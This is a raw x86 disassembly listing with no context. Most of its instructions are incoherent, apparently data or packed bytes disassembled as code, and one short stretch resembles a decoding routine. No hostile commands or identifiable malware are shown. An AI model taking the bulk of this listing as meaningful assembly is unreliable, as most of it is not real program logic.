  40b30f:	fimul  DWORD PTR [ebx-0x29]
  40b312:	retf   
  40b313:	cmc    
  40b314:	push   ebx
  40b315:	push   0x175b1e35
  40b31a:	mov    edx,0xec37b84a
  40b31f:	call   0x6fe8:0xb3fd514d
  40b326:	push   si
  40b328:	out    dx,al
  40b329:	out    dx,al
  40b32a:	ins    DWORD PTR es:[edi],dx
  40b32b:	push   esi
  40b32c:	ss out 0xd7,eax
  40b32f:	test   DWORD PTR [edi+0x691964f],edi
  40b335:	mov    esi,0x2ed02fcc
  40b33a:	push   ds
  40b33b:	shr    BYTE PTR [ebx],cl
  40b33d:	fwait
  40b33e:	mov    ecx,0x678ceeda
  40b343:	dec    esp
  40b344:	popa   
  40b345:	jb     0x40b347
  40b347:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b348:	por    mm6,QWORD PTR [esi]
  40b34b:	push   edx
  40b34c:	fidivr DWORD PTR [edi]
  40b34e:	push   esi
  40b34f:	mov    ch,0x76
  40b351:	mov    ecx,0x3d319a3
  40b356:	adc    eax,0xa270418d
  40b35b:	mov    dh,ah
  40b35d:	gs mov cl,0xa9
  40b360:	dec    ebx
  40b361:	fs xor bl,dl
  40b364:	in     eax,dx
  40b365:	jmp    0x7de074cf
  40b36a:	outs   dx,BYTE PTR ds:[esi]
  40b36b:	(bad)  
  40b36c:	pop    eax
  40b36d:	fwait
  40b36e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b36f:	sbb    al,0xa1
  40b371:	sbb    al,0x93
  40b373:	shl    DWORD PTR [ebp+0x3cc409e6],1
  40b379:	jbe    0x40b303
  40b37b:	(bad)  
  40b37c:	fild   QWORD PTR [eax+edi*1]
  40b37f:	inc    ebp
  40b380:	(bad)  
  40b381:	cli    
  40b382:	int    0xdf
  40b384:	pop    esp
  40b385:	and    edx,ecx
  40b387:	xor    cl,bl
  40b389:	jae    0x40b409
  40b38b:	sub    ch,BYTE PTR [esi-0x54d40092]
  40b391:	jbe    0x40b358
  40b393:	ins    DWORD PTR es:[edi],dx
  40b394:	div    DWORD PTR ds:0x56ce62d0
  40b39a:	dec    ebx
  40b39b:	cld    
  40b39c:	loopne 0x40b36b
  40b39e:	loop   0x40b329
  40b3a0:	sbb    eax,esp
  40b3a2:	pop    ss
  40b3a3:	fmul   QWORD PTR [ebx+esi*1+0x5281882d]
  40b3aa:	loopne 0x40b3b7
  40b3ac:	push   edx
  40b3ad:	enter  0xeadc,0xe1
  40b3b1:	lock cli 
  40b3b3:	ss xor ebx,esp
  40b3b6:	pop    ebx
  40b3b7:	sbb    bh,ah
  40b3b9:	sbb    ebx,DWORD PTR [ebp-0x27775b63]
  40b3bf:	sbb    eax,DWORD PTR [edx]
  40b3c1:	xchg   DWORD PTR [ebx-0x6bf9d5ee],edx
  40b3c7:	gs jmp 0xe18e:0x44140416
  40b3cf:	sbb    dl,BYTE PTR [esi+eiz*1]
  40b3d2:	stos   DWORD PTR es:[edi],eax
  40b3d3:	retf   
  40b3d4:	scas   al,BYTE PTR es:[edi]
  40b3d5:	hlt    
  40b3d6:	jne    0x40b375
  40b3d8:	xchg   ebp,eax
  40b3d9:	mov    ebp,0xb5eae8fc
  40b3de:	bswap  ecx
  40b3e0:	(bad)  
  40b3e1:	mov    eax,0x99f8c6cc
  40b3e6:	pop    es
  40b3e7:	xor    ah,ch
  40b3e9:	cmc    
  40b3ea:	jle    0x40b431
  40b3ec:	xchg   edx,eax
  40b3ed:	or     al,0x44
  40b3ef:	stos   DWORD PTR es:[edi],eax
  40b3f0:	jmp    0x40b3ba
  40b3f2:	sbb    al,0x8f
  40b3f4:	shl    BYTE PTR [ebx+0x67],1
  40b3f7:	or     al,0xa
  40b3f9:	inc    esi
  40b3fa:	jle    0x40b44a
  40b3fc:	xchg   edx,eax
  40b3fd:	inc    ebp
  40b3fe:	popf   
  40b3ff:	fdiv   QWORD PTR [ebx+ebp*1]
  40b402:	fistp  QWORD PTR [ebx]
  40b404:	fimul  DWORD PTR [edi]
  40b406:	xchg   DWORD PTR [edi],ebx
  40b408:	add    al,0x0
  40b40a:	add    BYTE PTR [ebx-0x58162bab],cl
  40b410:	or     BYTE PTR [eax],al
  40b412:	add    cl,ch
  40b414:	adc    al,BYTE PTR [eax+eax*1]
  40b417:	add    bl,dl
  40b419:	dec    edi
  40b41a:	int3   
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x1
  40b425:	stos   BYTE PTR es:[edi],al
  40b426:	jecxz  0x40b3fe
  40b428:	call   0x70bf32b3
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b404
  40b431:	into   
  40b432:	sub    eax,0x8f853020
  40b437:	mov    edx,0x931b699e
  40b43c:	hlt    
  40b43d:	mov    ?,edi
  40b43f:	xchg   edx,eax
  40b440:	addr16 mov ecx,0xc445d20c
  40b446:	fwait
  40b447:	and    bh,bh
  40b449:	cmp    DWORD PTR [ecx+eiz*2],eax
  40b44c:	jmp    0x122c:0x3e3c72ff
  40b453:	das    
  40b454:	into   
  40b455:	jne    0x40b44f
  40b457:	push   eax
  40b458:	(bad)  
  40b459:	and    DWORD PTR [edi+esi*1+0x230aa219],eax
  40b460:	inc    eax
  40b461:	adc    DWORD PTR [ebx],ecx
  40b463:	or     al,0xd0
  40b465:	mov    bl,0xd6
  40b467:	cli    
  40b468:	add    DWORD PTR [ebp+0x7e],esi
  40b46b:	mov    ch,0x8
  40b46d:	loope  0x40b45a
  40b46f:	sahf   
  40b470:	mov    edx,?
  40b472:	sahf   
  40b473:	ficom  WORD PTR [ebp+0x44]
  40b476:	pop    edi
  40b477:	cli    
  40b478:	pop    ss
  40b479:	popf   
  40b47a:	dec    esi
  40b47b:	test   DWORD PTR [edx+0x3c],0xe1d61d01
  40b482:	rcr    eax,1
  40b484:	loopne 0x40b4ae
  40b486:	jmp    0x40b40d
  40b488:	mov    edx,0x84181a0b
  40b48d:	(bad)  [ecx]
  40b48f:	jns    0x40b4a0
  40b491:	xlat   BYTE PTR ds:[ebx]
  40b492:	scas   eax,DWORD PTR es:[edi]
  40b493:	mov    ch,0x21
  40b495:	jmp    0xd393f310
  40b49a:	arpl   sp,sp
  40b49c:	xchg   esi,eax
  40b49d:	bound  edx,QWORD PTR [ebp-0x692552b5]
  40b4a3:	mov    ebx,0x16788ebb
  40b4a8:	popf   
  40b4a9:	das    
  40b4aa:	dec    ebx
  40b4ab:	mov    cs:0xf789753f,al
  40b4b1:	adc    bh,ah
  40b4b3:	jecxz  0x40b520
  40b4b5:	clc    
  40b4b6:	das    
  40b4b7:	mov    ch,0x60
  40b4b9:	js     0x40b47f
  40b4bb:	(bad)  
  40b4bc:	xor    BYTE PTR [ebx],al
  40b4be:	xchg   esi,eax
  40b4bf:	sbb    eax,0x720cf549
  40b4c4:	inc    edx
  40b4c5:	(bad)  
  40b4c6:	mov    esp,es
  40b4c8:	push   0xffffffdd
  40b4ca:	inc    ah
  40b4cc:	sbb    eax,0x1efe4f0e
  40b4d1:	sbb    al,0x6a
  40b4d3:	loop   0x40b54e
  40b4d5:	je     0x40b49e
  40b4d7:	in     eax,0x43
  40b4d9:	std    
  40b4da:	cwde   
  40b4db:	cmp    ch,dh
  40b4dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4de:	add    DWORD PTR [eax+0x72],ecx
  40b4e1:	in     eax,0x0
  40b4e3:	outs   dx,BYTE PTR ds:[esi]
  40b4e4:	out    dx,eax
  40b4e5:	popf   
  40b4e6:	mov    cl,0x5d
  40b4e8:	push   edi
  40b4e9:	xlat   BYTE PTR ds:[ebx]
  40b4ea:	int3   
  40b4eb:	in     al,0xa6
  40b4ed:	inc    BYTE PTR [eax+esi*1-0x6a]
  40b4f1:	jg     0x40b505
  40b4f3:	mov    dh,0xd8
  40b4f5:	mov    eax,ds:0xbd024b6b
  40b4fa:	imul   ebp,esi,0xfcf54dd3
  40b500:	pusha  
  40b501:	test   al,0x5e
  40b503:	fldenv [esi]
  40b505:	(bad)  
  40b506:	sub    edi,DWORD PTR [edi]
  40b508:	jg     0x40b584
  40b50a:	pop    ss
  40b50b:	xor    edi,0xffffffbc
  40b50e:	mov    eax,0x35799600
  40b513:	mov    WORD PTR [ebx-0x1d],ds
  40b516:	popa   
  40b517:	xchg   ecx,eax
  40b518:	sub    BYTE PTR [edi-0x39],cl
  40b51b:	and    al,0xda
  40b51d:	ins    BYTE PTR es:[edi],dx
  40b51e:	xchg   ah,al
  40b520:	mov    bh,0x10
  40b522:	call   0x872ca8ff
  40b527:	les    ebx,FWORD PTR [esi-0x4e]
  40b52a:	push   eax
  40b52b:	add    esi,DWORD PTR ds:0xc106140c
  40b531:	adc    BYTE PTR ds:0x782ec2f,0x39
  40b538:	mov    ch,0x7c
  40b53a:	xlat   BYTE PTR ds:[ebx]
  40b53b:	and    al,0x5f
  40b53d:	bound  esi,QWORD PTR [ecx]
  40b53f:	test   BYTE PTR [ecx],bh
  40b541:	mov    dl,0x95
  40b543:	sbb    dl,cl
  40b545:	xor    BYTE PTR [edi+0x267a561e],al
  40b54b:	nop
  40b54c:	xchg   ebx,eax
  40b54d:	sub    ebx,DWORD PTR [ebx+0x35b13bdf]
  40b553:	cmp    DWORD PTR [edi-0x10869c73],edi
  40b559:	sbb    BYTE PTR [esi],dh
  40b55b:	nop
  40b55c:	addr16 pusha 
  40b55e:	jns    0x40b5d3
  40b560:	jle    0x40b5d3
  40b562:	div    al
  40b564:	jbe    0x40b542
  40b566:	mov    ds,WORD PTR [ebp-0x6e28fa0d]
  40b56c:	inc    edi
  40b56d:	jle    0x40b563
  40b56f:	pop    eax
  40b570:	lds    esp,FWORD PTR [ebp+0x49]
  40b573:	ins    DWORD PTR es:[edi],dx
  40b574:	push   0x8c289229
  40b579:	jl     0x40b55f
  40b57b:	out    dx,eax
  40b57c:	idiv   dl
  40b57e:	and    BYTE PTR gs:[edi+ebp*4+0x1631ad54],0xdc
  40b587:	dec    ecx
  40b588:	std    
  40b589:	dec    esp
  40b58a:	sbb    al,0x73
  40b58c:	rol    DWORD PTR [edi+0x72015011],cl
  40b592:	xchg   esi,eax
  40b593:	mov    ah,0x44
  40b595:	sub    al,0x22
  40b597:	int3   
  40b598:	push   edi
  40b599:	arpl   WORD PTR [ebx-0x7f],si
  40b59c:	xchg   esp,edi
  40b59e:	mov    DWORD PTR [esi],eax
  40b5a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5a1:	gs pop ds
  40b5a3:	lods   eax,DWORD PTR ds:[esi]
  40b5a4:	pusha  
  40b5a5:	xor    bl,bh
  40b5a7:	push   esp
  40b5a8:	xchg   edi,eax
  40b5a9:	mov    ds:0x7532dd2c,al
  40b5ae:	xchg   ecx,eax
  40b5af:	fcom   st(2)
  40b5b1:	mov    edx,0xee428975
  40b5b6:	mov    edx,0xc662d389
  40b5bb:	jmp    DWORD PTR [edx]
  40b5bd:	sub    DWORD PTR [eax-0x7fea2813],0xffffffb3
  40b5c4:	fnstsw WORD PTR [eax-0x5f]
  40b5c7:	jle    0x40b573
  40b5c9:	and    DWORD PTR [ecx+0x6e96ade8],0x32
  40b5d0:	scas   eax,DWORD PTR es:[edi]
  40b5d1:	(bad)  
  40b5d2:	mov    ecx,0xda2b419
  40b5d7:	mov    ebx,ecx
  40b5d9:	mov    dl,0x85
  40b5db:	clc    
  40b5dc:	mov    ecx,0x6f99cb3
  40b5e1:	push   es
  40b5e2:	xchg   esi,eax
  40b5e3:	dec    eax
  40b5e4:	hlt    
  40b5e5:	aad    0xb0
  40b5e7:	jp     0x40b651
  40b5e9:	cs popf 
  40b5eb:	hlt    
  40b5ec:	sub    DWORD PTR fs:[esi],edx
  40b5ef:	pop    ebx
  40b5f0:	inc    ebp
  40b5f1:	mov    al,0xdf
  40b5f3:	fs ja  0x40b603
  40b5f6:	into   
  40b5f7:	add    al,0xd6
  40b5f9:	add    esp,DWORD PTR [edx-0x459ce6d5]
  40b5ff:	in     al,dx
  40b600:	cmp    DWORD PTR [eax],ebx
  40b602:	mov    dl,0xa3
  40b604:	push   ebx
  40b605:	pop    esi
  40b606:	push   ss
  40b607:	mov    ebp,0x776e7cc7
  40b60c:	or     esi,edi
  40b60e:	clc    
  40b60f:	inc    BYTE PTR [edi-0x5a7663db]
  40b615:	les    edi,FWORD PTR [eax]
  40b617:	lds    edi,FWORD PTR [ecx+esi*8]
  40b61a:	inc    edx
  40b61b:	out    dx,eax
  40b61c:	aas    
  40b61d:	loopne 0x40b5ac
  40b61f:	cli    
  40b620:	xor    BYTE PTR [esi],ah
  40b622:	dec    eax
  40b623:	xchg   esp,eax
  40b624:	(bad)  
  40b625:	mov    dl,0x9d
  40b627:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b628:	xor    DWORD PTR [esp+edx*2+0x16],esp
  40b62c:	mov    DWORD PTR [eax+ebp*8],ecx
  40b62f:	pop    edx
  40b630:	jmp    0x40b66d
  40b632:	jecxz  0x40b5fb
  40b634:	nop
  40b635:	jge    0x40b617
  40b637:	jb     0x40b646
  40b639:	inc    ecx
  40b63a:	push   ecx
  40b63b:	and    BYTE PTR [ebx-0x6428ca64],dh
  40b641:	inc    edi
  40b642:	(bad)  
  40b643:	xchg   esi,eax
  40b644:	repz out 0xfc,eax
  40b647:	dec    ebx
  40b648:	sbb    eax,DWORD PTR [ebx+0x32]
  40b64b:	inc    edx
  40b64c:	scas   al,BYTE PTR es:[edi]
  40b64d:	xlat   BYTE PTR es:[ebx]
  40b64f:	int    0xa3
  40b651:	ins    BYTE PTR es:[edi],dx
  40b652:	mov    eax,0xb61ea38f
  40b657:	and    BYTE PTR [ecx-0x17],cl
  40b65a:	in     eax,0x79
  40b65c:	ins    DWORD PTR es:[edi],dx
  40b65d:	loopne 0x40b646
  40b65f:	push   esp
  40b660:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b661:	addr16 mov eax,ds:0xebec
  40b665:	sbb    al,0x1a
  40b667:	pop    edi
  40b668:	xlat   BYTE PTR ds:[ebx]
  40b669:	(bad)  
  40b66a:	fcmovne st,st(4)
  40b66c:	or     eax,0xf7eab51d
  40b671:	cmp    BYTE PTR [eax+0x1],bl
  40b674:	inc    eax
  40b675:	cmp    BYTE PTR [eax+0x20],0xf5
  40b679:	push   ecx
  40b67a:	mov    ds:0x2e17d39a,al
  40b67f:	imul   eax,DWORD PTR [edx],0x18
  40b682:	ret    0xa2c5
  40b685:	in     eax,dx
  40b686:	inc    ecx
  40b687:	xor    DWORD PTR [edx-0x64],edi
  40b68a:	sub    ecx,ebx
  40b68c:	cwde   
  40b68d:	mov    bl,0xbc
  40b68f:	dec    esi
  40b690:	pop    edi
  40b691:	jb     0x40b61d
  40b693:	sahf   
  40b694:	pop    esp
  40b695:	clc    
  40b696:	jecxz  0x40b6a5
  40b698:	sub    edi,DWORD PTR [ebp+0x1cc8d3b6]
  40b69e:	in     al,dx
  40b69f:	loope  0x40b6b6
  40b6a1:	and    edx,ebp
  40b6a3:	mov    al,ds:0x70535cc1
  40b6a8:	mov    bh,0x3e
  40b6aa:	cmp    esi,DWORD PTR [esi]
  40b6ac:	adc    BYTE PTR [ecx+0x322e2138],al
  40b6b2:	je     0x40b6d3
  40b6b4:	(bad)  
  40b6b5:	ins    DWORD PTR es:[edi],dx
  40b6b6:	arpl   WORD PTR [ecx-0x72],bx
  40b6b9:	outs   dx,BYTE PTR ds:[esi]
  40b6ba:	add    BYTE PTR cs:[ebx],cl
  40b6bd:	fs jno 0x40b6a4
  40b6c0:	push   cs
  40b6c1:	aad    0x51
  40b6c3:	in     al,0x71
  40b6c5:	add    dh,bh
  40b6c7:	xor    DWORD PTR [ebx-0x56f457d4],ecx
  40b6cd:	call   eax
  40b6cf:	mov    eax,0x52789cfe
  40b6d4:	je     0x40b68b
  40b6d6:	out    0xf3,al
  40b6d8:	movntps XMMWORD PTR [ecx],xmm6
  40b6db:	dec    edi
  40b6dc:	sbb    ch,BYTE PTR [ebx-0x47]
  40b6df:	in     al,dx
  40b6e0:	and    eax,0x88826cc9
  40b6e5:	or     ah,BYTE PTR [eax]
  40b6e7:	fild   DWORD PTR [esi-0x4bdffce5]
  40b6ed:	xor    eax,0xb4a16eac
  40b6f2:	into   
  40b6f3:	scas   eax,DWORD PTR es:[edi]
  40b6f4:	push   ebx
  40b6f5:	xchg   edi,eax
  40b6f6:	(bad)  
  40b6f7:	iret   
  40b6f8:	cli    
  40b6f9:	pop    ds
  40b6fa:	pop    eax
  40b6fb:	lock push cs
  40b6fd:	adc    BYTE PTR [ecx+0x1bfd8686],ch
  40b703:	jbe    0x40b6d8
  40b705:	bound  edx,QWORD PTR [edx+0x25]
  40b708:	or     ebx,DWORD PTR [ebx+0x4c3016c2]
  40b70e:	ins    BYTE PTR es:[edi],dx
  40b70f:	pusha  
  40b710:	fsub   QWORD PTR [edi-0x1e220aed]
  40b716:	or     ax,0xebe2
  40b71a:	xor    al,0xab
  40b71c:	rcr    edx,0x6d
  40b71f:	add    BYTE PTR [ecx-0x65011c61],ch
  40b725:	ins    DWORD PTR es:[edi],dx
  40b726:	jo     0x40b6e4
  40b728:	aad    0x50
  40b72a:	sahf   
  40b72b:	mov    ecx,0xee367dd
  40b730:	int    0xfa
  40b732:	es (bad) 
  40b734:	shr    bl,cl
  40b736:	jnp    0x40b798
  40b738:	and    cl,BYTE PTR [ebp+0x23c3aaf0]
  40b73e:	outs   dx,BYTE PTR ds:[esi]
  40b73f:	jge    0x40b6de
  40b741:	aaa    
  40b742:	scas   al,BYTE PTR es:[edi]
  40b743:	std    
  40b744:	adc    esp,DWORD PTR [esi]
  40b746:	pop    esi
  40b747:	pushf  
  40b748:	xchg   DWORD PTR [edx+0x37985a17],ebx
  40b74e:	push   ecx
  40b74f:	cmp    DWORD PTR ds:0x5e93956b,edx
  40b755:	lods   al,BYTE PTR ds:[esi]
  40b756:	pop    ebp
  40b757:	imul   DWORD PTR [edx+0x2ea204a1]
  40b75d:	aad    0xef
  40b75f:	je     0x40b718
  40b761:	sbb    al,0x7a
  40b763:	xchg   BYTE PTR [esp+edi*4],dh
  40b766:	xor    ebx,edx
  40b768:	inc    edx
  40b769:	mov    eax,0x4fda6b87
  40b76e:	xchg   edx,eax
  40b76f:	sub    DWORD PTR [ebp-0x28],0xf7b5ad97
  40b776:	sbb    eax,0x78b73539
  40b77b:	or     eax,0xd81f0100
  40b780:	and    esp,DWORD PTR [ebx+0x21]
  40b783:	imul   esi,edx,0xffffffc1
  40b786:	push   0x6
  40b788:	or     BYTE PTR [edx+0x391a142d],cl
  40b78e:	pop    esp
  40b78f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b790:	cmp    DWORD PTR [edx-0x21],edi
  40b793:	mov    cl,0x7e
  40b795:	dec    ebx
  40b796:	add    esi,DWORD PTR [ebp-0xafdd33a]
  40b79c:	and    al,0xe1
  40b79e:	lahf   
  40b79f:	cmp    cl,bh
  40b7a1:	retf   
  40b7a2:	cmp    al,0x3f
  40b7a4:	sub    esi,esi
  40b7a6:	xchg   esp,eax
  40b7a7:	stos   BYTE PTR es:[edi],al
  40b7a8:	xor    al,0xab
  40b7aa:	(bad)  
  40b7ab:	jge    0x40b7a6
  40b7ad:	shl    DWORD PTR [edx+0x5b],0xdc
  40b7b1:	cmp    DWORD PTR [edx+0x64f9b16c],esp
  40b7b7:	hlt    
  40b7b8:	int    0xcf
  40b7ba:	push   ebx
  40b7bb:	push   0xfffffff0
  40b7bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b7be:	sub    edx,DWORD PTR [edi+0x6e9aea46]
  40b7c4:	add    ebx,DWORD PTR [esi-0x28]
  40b7c7:	adc    DWORD PTR [edi],edx
  40b7c9:	jbe    0x40b7f3
  40b7cb:	int3   
  40b7cc:	cli    
  40b7cd:	pop    eax
  40b7ce:	or     DWORD PTR [ecx-0x10],0xbb056155
  40b7d5:	and    BYTE PTR [ebx],dh
  40b7d7:	mov    ebx,0x2181fa1b
  40b7dc:	add    eax,0x965163d0
  40b7e1:	xlat   BYTE PTR ds:[ebx]
  40b7e2:	lods   eax,DWORD PTR ds:[esi]
  40b7e3:	xor    al,0xdb
  40b7e5:	mov    al,ds:0xf14f66e0
  40b7ea:	dec    ecx
  40b7eb:	iret   
  40b7ec:	jb     0x40b7cf
  40b7ee:	xor    eax,0x7bd769de
  40b7f3:	or     DWORD PTR [ebp+ecx*1+0x32dd1f7a],0xa926fac6
  40b7fe:	cli    
  40b7ff:	mov    dh,0xcc
  40b801:	popf   
  40b802:	xor    BYTE PTR [eax+ebx*4+0x1c],bh
  40b806:	sub    DWORD PTR [eax+0x13],esi
  40b809:	or     DWORD PTR [ebx+ebp*8-0x77],edi
  40b80d:	inc    ecx
  40b80e:	sbb    al,0xe7
  40b810:	push   ds
  40b811:	fadd   DWORD PTR [esi+0x27]
  40b814:	pop    edx
  40b815:	mov    al,0x93
  40b817:	adc    cl,BYTE PTR [ebx-0x1713e65]
  40b81d:	sub    ecx,DWORD PTR [ecx]
  40b81f:	mov    ecx,0xfa969ba3
  40b824:	nop
  40b825:	call   0x558b:0x69128605
  40b82c:	int3   
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	xor    ebp,ebp
  40b8a6:	lods   al,BYTE PTR ds:[esi]
  40b8a7:	xchg   esi,eax
  40b8a8:	loop   0x40b82c
  40b8aa:	jle    0x40b92a
  40b8ac:	jo     0x40b927
  40b8ae:	jle    0x40b92e
  40b8b0:	pop    esp
  40b8b1:	dec    ebp
  40b8b2:	mov    ch,0xca
  40b8b4:	cmp    al,0x62
  40b8b6:	test   eax,0xd6a39f6e
  40b8bb:	mov    eax,ds:0x80a3fc60
  40b8c0:	or     DWORD PTR [esp+edx*2+0x54808108],0xffffffba
  40b8c8:	pmulhw mm2,QWORD PTR ds:[ebp-0x22]
  40b8cd:	sub    ah,BYTE PTR [eax+0x5276c422]
  40b8d3:	outs   dx,BYTE PTR ds:[esi]
  40b8d4:	cmp    BYTE PTR [ebx+0x27],dh
  40b8d7:	ja     0x40b88c
  40b8d9:	push   0x51
  40b8db:	xor    ebp,DWORD PTR [ebx+0x1f308c24]
  40b8e1:	sub    esp,DWORD PTR [ecx-0x618f158c]
  40b8e7:	enter  0xf1b2,0x4c
  40b8eb:	shr    DWORD PTR [eax],cl
  40b8ed:	pushf  
  40b8ee:	leave  
  40b8ef:	je     0x40b8a8
  40b8f1:	mov    al,ds:0xf7555d0c
  40b8f6:	sbb    eax,0x173df734
  40b8fb:	xchg   DWORD PTR [ecx+0x3],ebx
  40b8fe:	in     eax,dx
  40b8ff:	fwait
  40b900:	js     0x40b979
  40b902:	mov    ch,0x97
  40b904:	test   al,0x47
  40b906:	lock xor al,0x1b
  40b909:	push   edx
  40b90a:	sub    al,0xd5
  40b90c:	add    al,0x4d
  40b90e:	fadd   st,st(7)
  40b910:	cld    
  40b911:	(bad)  
  40b912:	daa    
  40b913:	int3   
  40b914:	std    
  40b915:	inc    eax
  40b916:	in     al,dx
  40b917:	add    al,BYTE PTR [edx-0x3a62e487]
  40b91d:	call   FWORD PTR [edx+0x20b19598]
  40b923:	xor    ecx,DWORD PTR [edi]
  40b925:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b926:	mov    al,ds:0xb8a9d595
  40b92b:	mov    esp,0x76a642a3
  40b930:	cwde   
  40b931:	test   al,0x4
  40b933:	cwde   
  40b934:	stos   DWORD PTR es:[edi],eax
  40b935:	adc    ebp,eax
  40b937:	dec    esp
  40b938:	mov    edi,0x12e4720
  40b93d:	jg     0x40b9a9
  40b93f:	adc    DWORD PTR [edi],0x3e
  40b942:	sti    
  40b943:	inc    edi
  40b944:	mov    eax,ds:0x6b19766c
  40b949:	or     eax,0x530d3bd9
  40b94e:	(bad)
  40b951:	adc    BYTE PTR [ebp-0x31],ch
  40b954:	stos   DWORD PTR es:[edi],eax
  40b955:	iret   
  40b956:	(bad)  
  40b957:	dec    esp
  40b958:	test   DWORD PTR [ebx],ebp
  40b95a:	test   cl,cl
  40b95c:	inc    ecx
  40b95d:	and    eax,DWORD PTR [esi]
  40b95f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b960:	aaa    
  40b961:	cwde   
  40b962:	enter  0xfb95,0xd1
  40b966:	imul   esp,DWORD PTR [ecx],0x33414b8a
  40b96c:	mov    ah,0x21
  40b96e:	rcr    eax,cl
  40b970:	xchg   esp,eax
  40b971:	or     bh,bl
  40b973:	pop    esi
  40b974:	mov    al,ds:0xa77a3775
  40b979:	jb     0x40b8fc
  40b97b:	or     al,0x6
  40b97d:	cmp    DWORD PTR [eax],eax
  40b97f:	cld    
  40b980:	pop    ebx
  40b981:	jge    0x40b995
  40b983:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b984:	mov    gs,esp
  40b986:	clc    
  40b987:	adc    al,0x91
  40b989:	fs in  al,dx
  40b98b:	retf   0x30c1
  40b98e:	cmc    
  40b98f:	jns    0x40ba0b
  40b991:	ror    esp,1
  40b993:	mov    dh,dh
  40b995:	test   al,0x72
  40b997:	outs   dx,DWORD PTR ds:[esi]
  40b998:	fs fs dec eax
  40b99b:	dec    ecx
  40b99c:	inc    ebp
  40b99d:	outs   dx,BYTE PTR ds:[esi]
  40b99e:	call   0x58fbcb6e
  40b9a3:	push   0x42
  40b9a5:	int    0xb
  40b9a7:	jmp    0x40b9ef
  40b9a9:	jns    0x40ba04
  40b9ab:	sbb    BYTE PTR [esi],cl
  40b9ad:	and    BYTE PTR [eax],bh
  40b9af:	jbe    0x40b97d
  40b9b1:	push   bx
  40b9b3:	loope  0x40b999
  40b9b5:	xor    eax,0xfac98e44
  40b9ba:	and    DWORD PTR [edx-0x3c1bb760],0xffffffb7
  40b9c1:	mov    ecx,cs
  40b9c3:	mov    ebx,0x50d81732
  40b9c8:	xor    ebx,DWORD PTR ds:0x34122e9b
  40b9ce:	push   ebx
  40b9cf:	sub    BYTE PTR cs:0x4dec6711,0x3c
  40b9d7:	shl    BYTE PTR [ebp+0x50095dbf],cl
  40b9dd:	sub    BYTE PTR [eax-0x52],ch
  40b9e0:	pop    esp
  40b9e1:	sbb    ecx,eax
  40b9e3:	fcom   DWORD PTR [ebp-0x1]
  40b9e6:	ds jns 0x40b983
  40b9e9:	add    al,0x4d
  40b9eb:	(bad)
  40b9ee:	add    ch,dh
  40b9f0:	and    al,0x47
  40b9f2:	sub    cl,BYTE PTR [edx+esi*1+0x44]
  40b9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9f7:	into   
  40b9f8:	jnp    0x40b9e1
  40b9fa:	stos   DWORD PTR es:[edi],eax
  40b9fb:	int    0xff
  40b9fd:	lds    edx,FWORD PTR [ecx-0x1d13bc07]
  40ba03:	add    BYTE PTR [bp+di],al
  40ba06:	aas    
  40ba07:	arpl   WORD PTR [ebx+0x0],sp
  40ba0a:	xchg   edi,eax
  40ba0b:	pop    ecx
  40ba0c:	mov    ecx,0xd653a363
  40ba11:	iret   
  40ba12:	sbb    ah,BYTE PTR [ebx+0x14]
  40ba15:	mov    ebx,0xb02b7ab5
  40ba1a:	out    0xa6,al
  40ba1c:	repnz adc bl,BYTE PTR ds:0xc91111d0
  40ba23:	das    
  40ba24:	cmc    
  40ba25:	std    
  40ba26:	lods   al,BYTE PTR ds:[esi]
  40ba27:	mov    esp,0x75efa37a
  40ba2c:	daa    
  40ba2d:	sbb    esi,DWORD PTR [ebx+0x52abdda8]
  40ba33:	sub    ch,BYTE PTR [edx]
  40ba35:	push   edi
  40ba36:	and    al,0xc3
  40ba38:	pop    esi
  40ba39:	jne    0x40ba2d
  40ba3b:	dec    eax
  40ba3c:	cwde   
  40ba3d:	jbe    0x40baa7
  40ba3f:	mov    al,ds:0xbc075677
